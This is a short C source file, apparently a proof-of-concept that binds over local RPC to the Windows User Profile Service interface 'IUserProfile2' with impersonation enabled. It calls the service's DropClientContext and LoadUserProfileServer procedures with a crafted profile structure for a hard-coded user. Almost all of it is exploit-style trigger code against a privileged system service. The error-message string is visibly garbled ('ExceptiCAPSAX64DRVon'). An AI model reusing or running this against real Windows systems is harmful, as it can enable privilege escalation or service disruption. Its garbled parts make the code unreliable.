#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <userenv.h>
#include "h.h"


int main(int argc, char* argv[])
{
    RPC_SECURITY_QOS SecurityQOS = { 0 };
    RPC_WSTR StringBinding = 0;

    RpcStringBindingComposeW((RPC_WSTR)L"326731e3-c1c0-4a69-ae20-7d9044a4ea5c", (RPC_WSTR)L"ncalrpc",
        0, L"IUserProfile2", 0, &StringBinding);

    RpcBindingFromStringBindingW(StringBinding, &DefaultIfName_v1_0_c_ifspec);

    SecurityQOS.Version = 1.0;
    SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
    SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

    RpcBindingSetAuthInfoExW(DefaultIfName_v1_0_c_ifspec, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);


  //RPC_S_INVALID_STRING_UUID
    RpcTryExcept
    {

        INT64 test = 0;
        void* chandle = &test;
        PROFILEINFOW pi;
        pi.dwSize = sizeof(pi);
        pi.dwFlags = PI_APPLYPOLICY;
        pi.hProfile = NULL;
        pi.lpDefaultPath = NULL;
        pi.lpPolicyPath = NULL;
        pi.lpProfilePath = NULL;
        pi.lpServerName = NULL;
        pi.lpUserName = "ztl";  //当前用户名
        Proc0_DropClientContext(DefaultIfName_v1_0_c_ifspec ,&pi, &chandle);
        Proc2_LoadUserProfileServer(DefaultIfName_v1_0_c_ifspec, chandle);
    }

        RpcExcept(1)
    {
        printf("RPC ExceptiCAPSAX64DRVon %d\n", RpcExceptionCode());
    }

    RpcEndExcept

        return 0;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
    return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
    free(ptr);
}






